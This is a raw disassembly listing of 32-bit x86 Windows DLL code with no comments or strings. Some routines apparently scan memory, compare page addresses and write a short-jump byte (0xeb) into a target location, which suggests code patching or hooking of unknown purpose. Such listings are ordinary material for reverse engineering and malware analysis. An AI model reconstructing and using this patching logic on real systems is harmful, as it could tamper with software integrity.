1000af2d:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000af33:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000af39:	50                   	push   %eax
1000af3a:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000af40:	d1 e0                	shl    $1,%eax
1000af42:	66 89 85 80 fe ff ff 	mov    %ax,-0x180(%ebp)
1000af49:	66 c7 85 82 fe ff ff 	movw   $0x200,-0x17e(%ebp)
1000af50:	00 02 
1000af52:	6a 08                	push   $0x8
1000af54:	6a 1c                	push   $0x1c
1000af56:	ff b5 90 fe ff ff    	push   -0x170(%ebp)
1000af5c:	6a 0a                	push   $0xa
1000af5e:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000af64:	e8 2f e9 ff ff       	call   0x10009898
1000af69:	83 c4 38             	add    $0x38,%esp
1000af6c:	50                   	push   %eax
1000af6d:	53                   	push   %ebx
1000af6e:	51                   	push   %ecx
1000af6f:	52                   	push   %edx
1000af70:	56                   	push   %esi
1000af71:	57                   	push   %edi
1000af72:	6a 00                	push   $0x0
1000af74:	68 80 00 00 00       	push   $0x80
1000af79:	68 57 02 00 00       	push   $0x257
1000af7e:	ff b5 c8 fe ff ff    	push   -0x138(%ebp)
1000af84:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000af8a:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000af90:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
1000af96:	8b 45 88             	mov    -0x78(%ebp),%eax
1000af99:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000af9f:	5f                   	pop    %edi
1000afa0:	5e                   	pop    %esi
1000afa1:	5a                   	pop    %edx
1000afa2:	59                   	pop    %ecx
1000afa3:	5b                   	pop    %ebx
1000afa4:	58                   	pop    %eax
1000afa5:	6a 00                	push   $0x0
1000afa7:	68 b8 04 01 10       	push   $0x100104b8
1000afac:	ff 15 fc e1 00 10    	call   *0x1000e1fc
1000afb2:	6a 08                	push   $0x8
1000afb4:	6a 1c                	push   $0x1c
1000afb6:	ff b5 90 fe ff ff    	push   -0x170(%ebp)
1000afbc:	6a 0a                	push   $0xa
1000afbe:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000afc4:	e8 cf e8 ff ff       	call   0x10009898
1000afc9:	ff b5 c4 fe ff ff    	push   -0x13c(%ebp)
1000afcf:	e8 6c 16 00 00       	call   0x1000c640
1000afd4:	83 c4 18             	add    $0x18,%esp
1000afd7:	84 c0                	test   %al,%al
1000afd9:	75 0c                	jne    0x1000afe7
1000afdb:	c7 45 84 c3 ff ff ff 	movl   $0xffffffc3,-0x7c(%ebp)
1000afe2:	e9 c1 00 00 00       	jmp    0x1000b0a8
1000afe7:	50                   	push   %eax
1000afe8:	53                   	push   %ebx
1000afe9:	51                   	push   %ecx
1000afea:	52                   	push   %edx
1000afeb:	56                   	push   %esi
1000afec:	57                   	push   %edi
1000afed:	6a 00                	push   $0x0
1000afef:	6a 1f                	push   $0x1f
1000aff1:	6a 00                	push   $0x0
1000aff3:	6a 00                	push   $0x0
1000aff5:	6a 00                	push   $0x0
1000aff7:	68 00 06 00 00       	push   $0x600
1000affc:	ff 75 0c             	push   0xc(%ebp)
1000afff:	8b 45 8c             	mov    -0x74(%ebp),%eax
1000b002:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000b008:	89 45 84             	mov    %eax,-0x7c(%ebp)
1000b00b:	5f                   	pop    %edi
1000b00c:	5e                   	pop    %esi
1000b00d:	5a                   	pop    %edx
1000b00e:	59                   	pop    %ecx
1000b00f:	5b                   	pop    %ebx
1000b010:	58                   	pop    %eax
1000b011:	6a 00                	push   $0x0
1000b013:	e8 28 16 00 00       	call   0x1000c640
1000b018:	59                   	pop    %ecx
1000b019:	83 7d 84 00          	cmpl   $0x0,-0x7c(%ebp)
1000b01d:	0f 85 85 00 00 00    	jne    0x1000b0a8
1000b023:	80 7d e0 00          	cmpb   $0x0,-0x20(%ebp)
1000b027:	74 78                	je     0x1000b0a1
1000b029:	6a 07                	push   $0x7
1000b02b:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000b02e:	50                   	push   %eax
1000b02f:	6a 01                	push   $0x1
1000b031:	68 d2 b1 00 10       	push   $0x1000b1d2
1000b036:	ff b5 68 fc ff ff    	push   -0x398(%ebp)
1000b03c:	6a 11                	push   $0x11
1000b03e:	68 88 05 01 10       	push   $0x10010588
1000b043:	e8 ed e7 ff ff       	call   0x10009835
1000b048:	6a 08                	push   $0x8
1000b04a:	6a 04                	push   $0x4
1000b04c:	ff b5 90 fe ff ff    	push   -0x170(%ebp)
1000b052:	6a 0a                	push   $0xa
1000b054:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000b05a:	e8 39 e8 ff ff       	call   0x10009898
1000b05f:	ff b5 c4 fe ff ff    	push   -0x13c(%ebp)
1000b065:	e8 d6 15 00 00       	call   0x1000c640
1000b06a:	83 c4 34             	add    $0x34,%esp
1000b06d:	84 c0                	test   %al,%al
1000b06f:	0f 84 66 ff ff ff    	je     0x1000afdb
1000b075:	83 4d 84 ff          	orl    $0xffffffff,-0x7c(%ebp)
1000b079:	50                   	push   %eax
1000b07a:	53                   	push   %ebx
1000b07b:	51                   	push   %ecx
1000b07c:	52                   	push   %edx
1000b07d:	56                   	push   %esi
1000b07e:	57                   	push   %edi
1000b07f:	6a 64                	push   $0x64
1000b081:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000b084:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000b08a:	89 45 84             	mov    %eax,-0x7c(%ebp)
1000b08d:	5f                   	pop    %edi
1000b08e:	5e                   	pop    %esi
1000b08f:	5a                   	pop    %edx
1000b090:	59                   	pop    %ecx
1000b091:	5b                   	pop    %ebx
1000b092:	58                   	pop    %eax
1000b093:	6a 00                	push   $0x0
1000b095:	e8 a6 15 00 00       	call   0x1000c640
1000b09a:	59                   	pop    %ecx
1000b09b:	80 7d e1 00          	cmpb   $0x0,-0x1f(%ebp)
1000b09f:	75 07                	jne    0x1000b0a8
1000b0a1:	c7 45 84 c0 ff ff ff 	movl   $0xffffffc0,-0x7c(%ebp)
1000b0a8:	33 db                	xor    %ebx,%ebx
1000b0aa:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b0ae:	e8 07 00 00 00       	call   0x1000b0ba
1000b0b3:	8b 45 84             	mov    -0x7c(%ebp),%eax
1000b0b6:	eb 17                	jmp    0x1000b0cf
1000b0b8:	33 db                	xor    %ebx,%ebx
1000b0ba:	39 5d b0             	cmp    %ebx,-0x50(%ebp)
1000b0bd:	74 0c                	je     0x1000b0cb
1000b0bf:	ff 75 b0             	push   -0x50(%ebp)
1000b0c2:	ff 15 98 e0 00 10    	call   *0x1000e098
1000b0c8:	89 5d b0             	mov    %ebx,-0x50(%ebp)
1000b0cb:	c3                   	ret
1000b0cc:	6a 57                	push   $0x57
1000b0ce:	58                   	pop    %eax
1000b0cf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b0d2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b0d9:	5f                   	pop    %edi
1000b0da:	5e                   	pop    %esi
1000b0db:	5b                   	pop    %ebx
1000b0dc:	c9                   	leave
1000b0dd:	c3                   	ret
1000b0de:	55                   	push   %ebp
1000b0df:	8b ec                	mov    %esp,%ebp
1000b0e1:	6a ff                	push   $0xffffffff
1000b0e3:	68 30 e6 00 10       	push   $0x1000e630
1000b0e8:	68 00 c6 00 10       	push   $0x1000c600
1000b0ed:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b0f3:	50                   	push   %eax
1000b0f4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b0fb:	83 ec 24             	sub    $0x24,%esp
1000b0fe:	53                   	push   %ebx
1000b0ff:	56                   	push   %esi
1000b100:	57                   	push   %edi
1000b101:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000b104:	33 db                	xor    %ebx,%ebx
1000b106:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000b109:	8b 75 08             	mov    0x8(%ebp),%esi
1000b10c:	8b 46 04             	mov    0x4(%esi),%eax
1000b10f:	8b 38                	mov    (%eax),%edi
1000b111:	89 7d d8             	mov    %edi,-0x28(%ebp)
1000b114:	8b 46 50             	mov    0x50(%esi),%eax
1000b117:	8d 04 87             	lea    (%edi,%eax,4),%eax
1000b11a:	89 46 08             	mov    %eax,0x8(%esi)
1000b11d:	8b 08                	mov    (%eax),%ecx
1000b11f:	89 4e 0c             	mov    %ecx,0xc(%esi)
1000b122:	8d 4e 40             	lea    0x40(%esi),%ecx
1000b125:	8d 56 1c             	lea    0x1c(%esi),%edx
1000b128:	53                   	push   %ebx
1000b129:	6a 04                	push   $0x4
1000b12b:	51                   	push   %ecx
1000b12c:	50                   	push   %eax
1000b12d:	52                   	push   %edx
1000b12e:	e8 5f 13 00 00       	call   0x1000c492
1000b133:	83 c4 14             	add    $0x14,%esp
1000b136:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000b139:	3b c3                	cmp    %ebx,%eax
1000b13b:	75 72                	jne    0x1000b1af
1000b13d:	8b 4e 10             	mov    0x10(%esi),%ecx
1000b140:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000b143:	8b 46 04             	mov    0x4(%esi),%eax
1000b146:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000b149:	3b cb                	cmp    %ebx,%ecx
1000b14b:	74 5c                	je     0x1000b1a9
1000b14d:	33 c1                	xor    %ecx,%eax
1000b14f:	a9 00 f0 ff ff       	test   $0xfffff000,%eax
1000b154:	75 53                	jne    0x1000b1a9
1000b156:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000b15d:	8b 01                	mov    (%ecx),%eax
1000b15f:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000b162:	3b c7                	cmp    %edi,%eax
1000b164:	74 37                	je     0x1000b19d
1000b166:	8b 4e 50             	mov    0x50(%esi),%ecx
1000b169:	8d 04 88             	lea    (%eax,%ecx,4),%eax
1000b16c:	89 46 14             	mov    %eax,0x14(%esi)
1000b16f:	8b 08                	mov    (%eax),%ecx
1000b171:	89 4e 18             	mov    %ecx,0x18(%esi)
1000b174:	53                   	push   %ebx
1000b175:	6a 04                	push   $0x4
1000b177:	8d 4e 40             	lea    0x40(%esi),%ecx
1000b17a:	51                   	push   %ecx
1000b17b:	50                   	push   %eax
1000b17c:	8d 46 1c             	lea    0x1c(%esi),%eax
1000b17f:	50                   	push   %eax
1000b180:	e8 0d 13 00 00       	call   0x1000c492
1000b185:	83 c4 14             	add    $0x14,%esp
1000b188:	89 45 cc             	mov    %eax,-0x34(%ebp)
1000b18b:	3b c3                	cmp    %ebx,%eax
1000b18d:	74 17                	je     0x1000b1a6
1000b18f:	eb 0c                	jmp    0x1000b19d
1000b191:	6a 01                	push   $0x1
1000b193:	58                   	pop    %eax
1000b194:	c3                   	ret
1000b195:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b198:	33 db                	xor    %ebx,%ebx
1000b19a:	8b 75 08             	mov    0x8(%ebp),%esi
1000b19d:	89 5e 10             	mov    %ebx,0x10(%esi)
1000b1a0:	89 5e 14             	mov    %ebx,0x14(%esi)
1000b1a3:	89 5e 18             	mov    %ebx,0x18(%esi)
1000b1a6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000b1a9:	c6 46 4c 01          	movb   $0x1,0x4c(%esi)
1000b1ad:	33 c0                	xor    %eax,%eax
1000b1af:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b1b3:	eb 0e                	jmp    0x1000b1c3
1000b1b5:	6a 01                	push   $0x1
1000b1b7:	58                   	pop    %eax
1000b1b8:	c3                   	ret
1000b1b9:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b1bc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b1c0:	6a d5                	push   $0xffffffd5
1000b1c2:	58                   	pop    %eax
1000b1c3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b1c6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b1cd:	5f                   	pop    %edi
1000b1ce:	5e                   	pop    %esi
1000b1cf:	5b                   	pop    %ebx
1000b1d0:	c9                   	leave
1000b1d1:	c3                   	ret
1000b1d2:	55                   	push   %ebp
1000b1d3:	8b ec                	mov    %esp,%ebp
1000b1d5:	6a ff                	push   $0xffffffff
1000b1d7:	68 48 e6 00 10       	push   $0x1000e648
1000b1dc:	68 00 c6 00 10       	push   $0x1000c600
1000b1e1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b1e7:	50                   	push   %eax
1000b1e8:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b1ef:	83 ec 10             	sub    $0x10,%esp
1000b1f2:	53                   	push   %ebx
1000b1f3:	56                   	push   %esi
1000b1f4:	57                   	push   %edi
1000b1f5:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000b1f8:	8b 75 08             	mov    0x8(%ebp),%esi
1000b1fb:	83 fe 0a             	cmp    $0xa,%esi
1000b1fe:	73 07                	jae    0x1000b207
1000b200:	b8 61 00 00 c0       	mov    $0xc0000061,%eax
1000b205:	eb 33                	jmp    0x1000b23a
1000b207:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000b20b:	56                   	push   %esi
1000b20c:	e8 38 00 00 00       	call   0x1000b249
1000b211:	56                   	push   %esi
1000b212:	e8 d0 00 00 00       	call   0x1000b2e7
1000b217:	ff 76 48             	push   0x48(%esi)
1000b21a:	ff 76 44             	push   0x44(%esi)
1000b21d:	8d 46 1c             	lea    0x1c(%esi),%eax
1000b220:	50                   	push   %eax
1000b221:	ff 16                	call   *(%esi)
1000b223:	83 c4 14             	add    $0x14,%esp
1000b226:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b22a:	eb 0e                	jmp    0x1000b23a
1000b22c:	6a 01                	push   $0x1
1000b22e:	58                   	pop    %eax
1000b22f:	c3                   	ret
1000b230:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b233:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b237:	6a d5                	push   $0xffffffd5
1000b239:	58                   	pop    %eax
1000b23a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b23d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b244:	5f                   	pop    %edi
1000b245:	5e                   	pop    %esi
1000b246:	5b                   	pop    %ebx
1000b247:	c9                   	leave
1000b248:	c3                   	ret
1000b249:	55                   	push   %ebp
1000b24a:	8b ec                	mov    %esp,%ebp
1000b24c:	6a ff                	push   $0xffffffff
1000b24e:	68 58 e6 00 10       	push   $0x1000e658
1000b253:	68 00 c6 00 10       	push   $0x1000c600
1000b258:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b25e:	50                   	push   %eax
1000b25f:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b266:	83 ec 10             	sub    $0x10,%esp
1000b269:	53                   	push   %ebx
1000b26a:	56                   	push   %esi
1000b26b:	57                   	push   %edi
1000b26c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000b26f:	33 db                	xor    %ebx,%ebx
1000b271:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000b274:	8b 75 08             	mov    0x8(%ebp),%esi
1000b277:	8d 7e 1c             	lea    0x1c(%esi),%edi
1000b27a:	53                   	push   %ebx
1000b27b:	6a 04                	push   $0x4
1000b27d:	8d 46 0c             	lea    0xc(%esi),%eax
1000b280:	50                   	push   %eax
1000b281:	ff 76 08             	push   0x8(%esi)
1000b284:	57                   	push   %edi
1000b285:	e8 08 12 00 00       	call   0x1000c492
1000b28a:	83 c4 14             	add    $0x14,%esp
1000b28d:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b290:	3b c3                	cmp    %ebx,%eax
1000b292:	74 06                	je     0x1000b29a
1000b294:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b298:	eb 3e                	jmp    0x1000b2d8
1000b29a:	39 5e 10             	cmp    %ebx,0x10(%esi)
1000b29d:	74 1f                	je     0x1000b2be
1000b29f:	8b 4e 14             	mov    0x14(%esi),%ecx
1000b2a2:	3b cb                	cmp    %ebx,%ecx
1000b2a4:	74 18                	je     0x1000b2be
1000b2a6:	8d 46 18             	lea    0x18(%esi),%eax
1000b2a9:	39 18                	cmp    %ebx,(%eax)
1000b2ab:	74 11                	je     0x1000b2be
1000b2ad:	53                   	push   %ebx
1000b2ae:	6a 04                	push   $0x4
1000b2b0:	50                   	push   %eax
1000b2b1:	51                   	push   %ecx
1000b2b2:	57                   	push   %edi
1000b2b3:	e8 da 11 00 00       	call   0x1000c492
1000b2b8:	83 c4 14             	add    $0x14,%esp
1000b2bb:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b2be:	c6 46 4d 01          	movb   $0x1,0x4d(%esi)
1000b2c2:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b2c6:	33 c0                	xor    %eax,%eax
1000b2c8:	eb 0e                	jmp    0x1000b2d8
1000b2ca:	6a 01                	push   $0x1
1000b2cc:	58                   	pop    %eax
1000b2cd:	c3                   	ret
1000b2ce:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b2d1:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b2d5:	6a d5                	push   $0xffffffd5
1000b2d7:	58                   	pop    %eax
1000b2d8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b2db:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b2e2:	5f                   	pop    %edi
1000b2e3:	5e                   	pop    %esi
1000b2e4:	5b                   	pop    %ebx
1000b2e5:	c9                   	leave
1000b2e6:	c3                   	ret
1000b2e7:	55                   	push   %ebp
1000b2e8:	8b ec                	mov    %esp,%ebp
1000b2ea:	6a ff                	push   $0xffffffff
1000b2ec:	68 68 e6 00 10       	push   $0x1000e668
1000b2f1:	68 00 c6 00 10       	push   $0x1000c600
1000b2f6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b2fc:	50                   	push   %eax
1000b2fd:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b304:	83 ec 18             	sub    $0x18,%esp
1000b307:	53                   	push   %ebx
1000b308:	56                   	push   %esi
1000b309:	57                   	push   %edi
1000b30a:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000b30d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000b311:	8b 45 08             	mov    0x8(%ebp),%eax
1000b314:	8b 48 30             	mov    0x30(%eax),%ecx
1000b317:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000b31a:	85 c9                	test   %ecx,%ecx
1000b31c:	74 26                	je     0x1000b344
1000b31e:	c6 45 dc eb          	movb   $0xeb,-0x24(%ebp)
1000b322:	6a 00                	push   $0x0
1000b324:	6a 01                	push   $0x1
1000b326:	8d 55 dc             	lea    -0x24(%ebp),%edx
1000b329:	52                   	push   %edx
1000b32a:	51                   	push   %ecx
1000b32b:	83 c0 1c             	add    $0x1c,%eax
1000b32e:	50                   	push   %eax
1000b32f:	e8 5e 11 00 00       	call   0x1000c492
1000b334:	83 c4 14             	add    $0x14,%esp
1000b337:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000b33a:	85 c0                	test   %eax,%eax
1000b33c:	74 06                	je     0x1000b344
1000b33e:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b342:	eb 16                	jmp    0x1000b35a
1000b344:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b348:	33 c0                	xor    %eax,%eax
1000b34a:	eb 0e                	jmp    0x1000b35a
1000b34c:	6a 01                	push   $0x1
1000b34e:	58                   	pop    %eax
1000b34f:	c3                   	ret
1000b350:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b353:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b357:	6a d5                	push   $0xffffffd5
1000b359:	58                   	pop    %eax
1000b35a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b35d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b364:	5f                   	pop    %edi
1000b365:	5e                   	pop    %esi
1000b366:	5b                   	pop    %ebx
1000b367:	c9                   	leave
1000b368:	c3                   	ret
1000b369:	55                   	push   %ebp
1000b36a:	8b ec                	mov    %esp,%ebp
1000b36c:	6a ff                	push   $0xffffffff
1000b36e:	68 78 e6 00 10       	push   $0x1000e678
1000b373:	68 00 c6 00 10       	push   $0x1000c600
1000b378:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b37e:	50                   	push   %eax
1000b37f:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b386:	83 ec 30             	sub    $0x30,%esp
1000b389:	53                   	push   %ebx
1000b38a:	56                   	push   %esi
1000b38b:	57                   	push   %edi
1000b38c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000b38f:	8b 7d 08             	mov    0x8(%ebp),%edi
1000b392:	85 ff                	test   %edi,%edi
1000b394:	0f 84 c4 00 00 00    	je     0x1000b45e
1000b39a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000b39e:	0f 84 ba 00 00 00    	je     0x1000b45e
1000b3a4:	8d 5f 1c             	lea    0x1c(%edi),%ebx
1000b3a7:	68 54 05 01 10       	push   $0x10010554
1000b3ac:	53                   	push   %ebx
1000b3ad:	e8 b7 e7 ff ff       	call   0x10009b69
1000b3b2:	59                   	pop    %ecx
1000b3b3:	59                   	pop    %ecx
1000b3b4:	8b f0                	mov    %eax,%esi
1000b3b6:	85 f6                	test   %esi,%esi
1000b3b8:	0f 84 a0 00 00 00    	je     0x1000b45e
1000b3be:	68 40 05 01 10       	push   $0x10010540
1000b3c3:	53                   	push   %ebx
1000b3c4:	e8 a0 e7 ff ff       	call   0x10009b69
1000b3c9:	59                   	pop    %ecx
1000b3ca:	59                   	pop    %ecx
1000b3cb:	85 c0                	test   %eax,%eax
1000b3cd:	0f 84 8b 00 00 00    	je     0x1000b45e
1000b3d3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000b3d6:	89 01                	mov    %eax,(%ecx)
1000b3d8:	89 77 04             	mov    %esi,0x4(%edi)
1000b3db:	83 67 10 00          	andl   $0x0,0x10(%edi)
1000b3df:	2b 77 20             	sub    0x20(%edi),%esi
1000b3e2:	89 75 dc             	mov    %esi,-0x24(%ebp)
1000b3e5:	68 28 05 01 10       	push   $0x10010528
1000b3ea:	ff 33                	push   (%ebx)
1000b3ec:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000b3f2:	8b d0                	mov    %eax,%edx
1000b3f4:	89 55 d8             	mov    %edx,-0x28(%ebp)
1000b3f7:	33 c0                	xor    %eax,%eax
1000b3f9:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000b3fc:	89 45 cc             	mov    %eax,-0x34(%ebp)
1000b3ff:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000b402:	bb ff ff bf ff       	mov    $0xffbfffff,%ebx
1000b407:	83 f8 64             	cmp    $0x64,%eax
1000b40a:	7d 2f                	jge    0x1000b43b
1000b40c:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
1000b40f:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
1000b412:	8b 09                	mov    (%ecx),%ecx
1000b414:	23 cb                	and    %ebx,%ecx
1000b416:	89 4d c8             	mov    %ecx,-0x38(%ebp)
1000b419:	3b 4d dc             	cmp    -0x24(%ebp),%ecx
1000b41c:	75 2b                	jne    0x1000b449
1000b41e:	8d 54 10 09          	lea    0x9(%eax,%edx,1),%edx
1000b422:	89 55 c4             	mov    %edx,-0x3c(%ebp)
1000b425:	8b 12                	mov    (%edx),%edx
1000b427:	23 d3                	and    %ebx,%edx
1000b429:	89 55 c0             	mov    %edx,-0x40(%ebp)
1000b42c:	8b f2                	mov    %edx,%esi
1000b42e:	33 f1                	xor    %ecx,%esi
1000b430:	f7 c6 00 f0 ff ff    	test   $0xfffff000,%esi
1000b436:	75 0e                	jne    0x1000b446
1000b438:	89 55 cc             	mov    %edx,-0x34(%ebp)
1000b43b:	8b 47 20             	mov    0x20(%edi),%eax
1000b43e:	03 45 cc             	add    -0x34(%ebp),%eax
1000b441:	89 47 10             	mov    %eax,0x10(%edi)
1000b444:	eb 10                	jmp    0x1000b456
1000b446:	8b 55 d8             	mov    -0x28(%ebp),%edx
1000b449:	40                   	inc    %eax
1000b44a:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000b44d:	eb b8                	jmp    0x1000b407
1000b44f:	6a 01                	push   $0x1
1000b451:	58                   	pop    %eax
1000b452:	c3                   	ret
1000b453:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b456:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b45a:	b0 01                	mov    $0x1,%al
1000b45c:	eb 02                	jmp    0x1000b460
1000b45e:	32 c0                	xor    %al,%al
1000b460:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b463:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b46a:	5f                   	pop    %edi
1000b46b:	5e                   	pop    %esi
1000b46c:	5b                   	pop    %ebx
1000b46d:	c9                   	leave
1000b46e:	c3                   	ret
1000b46f:	55                   	push   %ebp
1000b470:	8b ec                	mov    %esp,%ebp
1000b472:	81 ec 88 02 00 00    	sub    $0x288,%esp
1000b478:	53                   	push   %ebx
1000b479:	56                   	push   %esi
1000b47a:	8b 75 08             	mov    0x8(%ebp),%esi
1000b47d:	33 db                	xor    %ebx,%ebx
1000b47f:	3b f3                	cmp    %ebx,%esi
1000b481:	57                   	push   %edi
1000b482:	0f 84 47 02 00 00    	je     0x1000b6cf
1000b488:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
1000b48b:	0f 84 3e 02 00 00    	je     0x1000b6cf
1000b491:	8b 45 10             	mov    0x10(%ebp),%eax
1000b494:	3b c3                	cmp    %ebx,%eax
1000b496:	0f 84 33 02 00 00    	je     0x1000b6cf
1000b49c:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
1000b4a2:	8b 45 14             	mov    0x14(%ebp),%eax
1000b4a5:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
1000b4ab:	8b 45 18             	mov    0x18(%ebp),%eax
1000b4ae:	89 45 80             	mov    %eax,-0x80(%ebp)
1000b4b1:	8d 45 14             	lea    0x14(%ebp),%eax
1000b4b4:	50                   	push   %eax
1000b4b5:	8d 45 10             	lea    0x10(%ebp),%eax
1000b4b8:	50                   	push   %eax
1000b4b9:	88 5d a8             	mov    %bl,-0x58(%ebp)
1000b4bc:	e8 f6 09 00 00       	call   0x1000beb7
1000b4c1:	59                   	pop    %ecx
1000b4c2:	85 c0                	test   %eax,%eax
1000b4c4:	59                   	pop    %ecx
1000b4c5:	74 07                	je     0x1000b4ce
1000b4c7:	6a d4                	push   $0xffffffd4
1000b4c9:	e9 03 02 00 00       	jmp    0x1000b6d1
1000b4ce:	8d 45 84             	lea    -0x7c(%ebp),%eax
1000b4d1:	50                   	push   %eax
1000b4d2:	e8 fc e6 ff ff       	call   0x10009bd3
1000b4d7:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
1000b4dd:	6a 0d                	push   $0xd
1000b4df:	50                   	push   %eax
1000b4e0:	6a 07                	push   $0x7
1000b4e2:	68 d7 b6 00 10       	push   $0x1000b6d7
1000b4e7:	56                   	push   %esi
1000b4e8:	6a 17                	push   $0x17
1000b4ea:	68 bc 05 01 10       	push   $0x100105bc
1000b4ef:	e8 41 e3 ff ff       	call   0x10009835
1000b4f4:	8d 45 ac             	lea    -0x54(%ebp),%eax
1000b4f7:	81 c6 68 ff ff ff    	add    $0xffffff68,%esi
1000b4fd:	89 45 18             	mov    %eax,0x18(%ebp)
1000b500:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
1000b506:	81 e6 ff ff 00 00    	and    $0xffff,%esi
1000b50c:	68 f4 04 01 10       	push   $0x100104f4
1000b511:	50                   	push   %eax
1000b512:	c7 45 ac 30 00 00 00 	movl   $0x30,-0x54(%ebp)
1000b519:	89 5d b0             	mov    %ebx,-0x50(%ebp)
1000b51c:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
1000b51f:	89 5d b8             	mov    %ebx,-0x48(%ebp)
1000b522:	89 5d c0             	mov    %ebx,-0x40(%ebp)
1000b525:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
1000b528:	89 5d c8             	mov    %ebx,-0x38(%ebp)
1000b52b:	89 5d cc             	mov    %ebx,-0x34(%ebp)
1000b52e:	89 5d d0             	mov    %ebx,-0x30(%ebp)
1000b531:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
1000b534:	89 5d d8             	mov    %ebx,-0x28(%ebp)
1000b537:	89 75 bc             	mov    %esi,-0x44(%ebp)
1000b53a:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000b540:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
1000b546:	50                   	push   %eax
1000b547:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000b54d:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000b553:	83 c4 2c             	add    $0x2c,%esp
1000b556:	d1 e0                	shl    $1,%eax
1000b558:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
1000b55c:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
1000b562:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000b565:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000b568:	6a 08                	push   $0x8
